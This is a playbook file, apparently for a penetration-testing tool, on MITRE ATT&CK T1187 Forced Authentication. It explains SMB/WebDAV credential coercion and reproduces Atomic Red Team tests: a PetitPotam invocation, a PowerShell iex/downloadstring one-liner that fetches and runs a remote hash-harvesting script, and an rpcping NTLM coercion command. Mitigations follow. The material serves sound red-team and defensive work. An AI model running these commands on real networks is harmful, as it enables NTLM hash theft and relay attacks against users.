---
name: "T1187_forced-authentication"
description: "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1187
  - credential-access
  - windows
technique_id: "T1187"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1187"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1187 Forced Authentication

## High-Level Description

Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server. With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials.

There are several different ways this can occur. Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.

Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Forced Authentication technique is applicable to target environment
- [ ] Check Windows systems for indicators of Forced Authentication
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: PetitPotam

This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.

**Supported Platforms:** windows

```powershell
& "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
Write-Host "End of PetitPotam attack"
```

**Dependencies:**
- PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
And the computer must be domain joined (implicit authentication).

### Atomic Test 2: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS

PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
```

### Atomic Test 3: Trigger an authenticated RPC call to a target server with no Sign flag set

RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
Ref: https://twitter.com/splinter_code/status/1421144623678988298

**Supported Platforms:** windows

```powershell
rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Forced Authentication by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1187 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies
Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained.

### M1037 Filter Network Traffic
Block SMB traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137. Filter or block WebDAV protocol traffic from exiting the network. If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with allowlisting.


## Detection

### Detect Forced SMB/WebDAV Authentication via lure files and outbound NTLM


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Forced Authentication technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Rapid7](https://www.rapid7.com/blog/post/2021/08/03/petitpotam-novel-attack-chain-can-fully-compromise-windows-domains-running-ad-cs/)
- [Cylance Redirect to SMB](https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf)
- [GitHub Hashjacking](https://github.com/hob0/hashjacking)
- [Microsoft Managing WebDAV Security](https://web.archive.org/web/20100210125749/https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx)
- [Osanda Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
- [Didier Stevens WebDAV Traffic](https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/)
- [GitHub](https://github.com/topotam/PetitPotam)
- [US-CERT APT Energy Oct 2017](https://www.us-cert.gov/ncas/alerts/TA17-293A)
- [Wikipedia Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block)
- [Atomic Red Team - T1187](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1187)
- [MITRE ATT&CK - T1187](https://attack.mitre.org/techniques/T1187)
